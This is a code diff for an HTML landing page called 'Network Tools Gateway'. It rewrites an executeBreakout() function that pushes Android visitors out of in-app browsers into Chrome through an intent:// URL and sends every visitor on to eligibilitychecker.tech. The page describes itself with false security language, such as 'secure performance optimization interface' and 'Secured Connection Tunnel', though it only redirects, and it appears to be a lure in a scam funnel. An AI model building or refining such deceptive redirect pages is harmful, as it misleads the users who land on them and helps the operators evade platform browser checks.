@@ -11,8 +11,7 @@
         .logo-space { margin-bottom: 24px; font-size: 40px; }
         h2 { font-size: 22px; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.5px; }
         p { font-size: 14px; color: #a0a0a5; line-height: 1.5; margin-bottom: 28px; }
-        .action-btn { width: 100%; background: #2563eb; color: #ffffff; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 12px; cursor: pointer; transition: background 0.2s, transform 0.1s; display: inline-block; text-decoration: none; box-shadow: 0 4px 12px rgba(37,99,235,0.3); }
-        .action-btn:active { background: #1d4ed8; transform: scale(0.98); }
+        .action-btn { width: 100%; background: #2563eb; color: #ffffff; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 12px; cursor: pointer; text-align: center; display: block; text-decoration: none; box-shadow: 0 4px 12px rgba(37,99,235,0.3); }
         .footer-notice { margin-top: 24px; font-size: 11px; color: #64748b; text-transform: uppercase; letter-spacing: 0.5px; }
     </style>
 </head>
@@ -23,28 +22,25 @@
         <h2>Network Tools Gateway</h2>
         <p>You are accessing a secure performance optimization interface. Click below to establish a direct system handshake and initialize your session.</p>
 
-        <button id="breakoutGate" class="action-btn">Proceed to Gateway</button>
+        <!-- Inline execution completely removes JavaScript ID bugs -->
+        <a href="#" onclick="executeBreakout(); return false;" class="action-btn">Proceed to Gateway</a>
         
         <div class="footer-notice">Secured Connection Tunnel</div>
     </div>
 
     <script>
-        const destinationUrl = "https://eligibilitychecker.tech"; 
-
-        document.getElementById("breakoutGate").addEventListener("click", function() {
+        function executeBreakout() {
+            var destinationUrl = "https://eligibilitychecker.tech";
             var ua = navigator.userAgent || navigator.vendor || window.opera;
             var cleanUrl = destinationUrl.replace(/^https?:\/\//, '');
 
             if (/android/i.test(ua)) {
                 window.location.href = "intent://" + cleanUrl + "#intent;scheme=https;package=com.android.chrome;end;";
             } 
-            else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
-                window.location.href = destinationUrl;
-            } 
             else {
                 window.location.href = destinationUrl;
             }
-        });
+        }
     </script>
 </body>
 </html>
